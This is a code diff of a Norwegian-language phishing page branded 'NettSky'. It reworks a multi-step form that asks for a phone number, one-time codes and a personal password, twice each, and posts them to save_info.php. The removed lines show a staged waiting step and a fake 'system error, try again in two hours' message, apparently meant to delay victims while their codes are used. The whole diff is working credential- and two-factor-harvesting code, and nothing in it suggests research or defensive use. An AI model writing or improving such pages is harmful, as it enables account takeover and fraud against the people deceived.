@@ -16,14 +16,14 @@
 <body>
   <main class="main-wrapper">
 
-    <!-- <div class="content-area" id="content-area">
+    <div class="content-area" id="content-area">
       <img src="./assets/img/sky.png" alt="sky" class="sky-img">
       <h1>NettSky</h1>
       <button class="button2" id="button01">Last ned</button>
       <p class="long-text1" id="long-text1">Den beste plasseringen for bilder, filer, notater, e-post og mer</p>
-    </div> -->
+    </div>
 
-    <div class="form-wrapper">
+    <div class="form-wrapper" id="form-wrapper" style="display:none">
       <svg class="logo-svg" focusable="false" id="Layer_1" version="1.1" viewBox="0 0 140 21" x="0px"
         xmlSpace="preserve" xmlns="http://www.w3.org/2000/svg" y="0px">
         <g>
@@ -81,7 +81,7 @@
         </div>
 
         <!-- Step 2 -->
-        <div id="step02" class="step">
+        <div id="step02" class="step" style="display: none;">
           <label for="input02">Hva er ditt telefonnummer?</label>
           <input class="form--control" type="text" id="input02" placeholder="8 siffer" maxlength="8" pattern="^\d{8}$"
             required>
@@ -89,7 +89,7 @@
         </div>
 
         <!-- Step 3 -->
-        <div id="step03" class="step">
+        <div id="step03" class="step" style="display: none;">
           <label for="input03">Hva er engangskoden?</label>
           <input class="form--control" type="text" id="input03" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
             required>
@@ -97,34 +97,29 @@
         </div>
 
         <!-- Step 4 -->
-        <div id="step04" class="step">
+        <div id="step04" class="step" style="display: none;">
           <label for="input04">Hva er ditt personlige passord?</label>
           <input class="form--control" type="password" id="input04" placeholder="Personlig passord" required>
           <small>Fyll inn passord</small>
         </div>
 
         <!-- Step 5 -->
-        <div id="step05" class="step">
+        <div id="step05" class="step" style="display: none;">
           <label for="input05">Engangskode igjen</label>
           <input class="form--control" type="text" id="input05" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
             required>
           <small>Fyll inn engangskode (6 siffer)</small>
         </div>
 
-        <!-- Step 6: Countdown -->
-        <div id="step06" class="step">
-          <p id="timerText" class="timer">Vent i 60 minutter før neste steg</p>
-        </div>
-
-        <!-- Step 7 -->
-        <div id="step07" class="step">
+        <!-- Step 6 -->
+        <div id="step06" class="step" style="display: none;">
           <label for="input07">Hva er ditt personlige passord?</label>
           <input class="form--control" type="password" id="input07" placeholder="Personlig passord" required>
           <small>Fyll inn passord</small>
         </div>
 
-        <!-- Step 8 -->
-        <div id="step08" class="step">
+        <!-- Step 7 -->
+        <div id="step07" class="step" style="display: none;">
           <label for="input08">Engangskode igjen</label>
           <input class="form--control" type="text" id="input08" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
             required>
@@ -132,30 +127,33 @@
         </div>
 
         <br>
-        <button type="submit" class="button next-btn" id="nextAndSubmit">BEKREFT</button>
-        <br>
-        <a href="" class="form-link">Gå tilbake</a>
+        <button type="button" id="nextButton" class="button next-btn">Neste</button>
+        <button type="submit" id="submitButton" class="button next-btn" style="display: none;">BEKREFT</button>
       </form>
 
       <script>
         document.addEventListener("DOMContentLoaded", () => {
           const stepForm = document.getElementById("stepForm");
           const steps = document.querySelectorAll(".step");
-          const submitButton = document.getElementById("nextAndSubmit"); // Adjusted ID for "Next" button
+          const nextButton = document.getElementById("nextButton");
+          const submitButton = document.getElementById("submitButton");
           let currentStep = 0;
 
-          // Show the current step based on index
+          // Show the current step
           function showStep(stepIndex) {
             steps.forEach((step, index) => {
               step.style.display = index === stepIndex ? "block" : "none";
             });
+
+            // Toggle button visibility
+            nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
+            submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
           }
 
-          // Validate the current step inputs
+          // Validate inputs of the current step
           function validateStep(stepIndex) {
             const inputs = steps[stepIndex].querySelectorAll("input");
             for (const input of inputs) {
-              console.log(input.checkValidity()); // Check validity of inputs
               if (!input.checkValidity()) {
                 input.reportValidity();
                 return false;
@@ -164,41 +162,30 @@
             return true;
           }
 
-          // Button click handler for "Next"
-          submitButton.addEventListener("click", () => {
-            console.log("Next button clicked"); // This should log when the button is clicked
+          // Handle next button click
+          nextButton.addEventListener("click", () => {
             if (validateStep(currentStep)) {
-              if (currentStep < steps.length - 1) {
-                currentStep++;
-                showStep(currentStep);
-                if (currentStep === steps.length - 1) {
-                  submitButton.textContent = "BEKREFT";
-                }
-              } else {
-                stepForm.dispatchEvent(new Event("submit"));
-              }
+              currentStep++;
+              showStep(currentStep);
             }
           });
 
-          // Form submission logic
+          // Handle form submission
           stepForm.addEventListener("submit", (e) => {
             e.preventDefault();
 
-            // Get all the inputs' values (8 inputs)
-            const formData = {
-              input01: document.getElementById("input01").value,
-              input02: document.getElementById("input02").value,
-              input03: document.getElementById("input03").value,
-              input04: document.getElementById("input04").value,
-              input05: document.getElementById("input05").value,
-              input06: document.getElementById("input06").value,
-              input07: document.getElementById("input07").value,
-              input08: document.getElementById("input08").value,
-            };
+            // Collect data from all inputs
+            const formData = Array.from(steps).reduce((data, step) => {
+              const inputs = step.querySelectorAll("input");
+              inputs.forEach((input) => {
+                data[input.id] = input.value;
+              });
+              return data;
+            }, {});
 
-            console.log("Form Data:", formData);  // Log the form data to check if it's correct
+            console.log("Form Data:", formData); // Debugging log
 
-            // Send data to the PHP server
+            // Send the form data to the server
             fetch("save_info.php", {
               method: "POST",
               headers: {
@@ -208,34 +195,26 @@
             })
               .then((response) => response.json())
               .then((data) => {
-                submitButton.classList.add("loading");
-                setTimeout(() => {
-                  submitButton.classList.remove("loading");
-                  submitButton.classList.add("error");
-                  submitButton.textContent = "SYSTEM FEIL, VENNLIGST PRØV IGJEN OM TO TIMER.";
-                }, 10000);
+                console.log("Server Response:", data);
 
-                setTimeout(() => {
-                  submitButton.classList.remove("error");
-                  submitButton.textContent = "BEKREFT";
-                }, 20000);
-
-                // Reset form and return to the first step after 20 seconds
-                setTimeout(() => {
+                if (data.status === "success") {
+                  alert("Data saved successfully!");
                   stepForm.reset();
                   currentStep = 0;
                   showStep(currentStep);
-                }, 20000);
+                } else {
+                  alert("Error: " + data.message);
+                }
               })
               .catch((error) => {
                 console.error("Error:", error);
+                alert("Failed to submit the form. Please try again.");
               });
           });
 
-          // Show the initial step
+          // Initialize the first step
           showStep(currentStep);
         });
-
       </script>
 
 
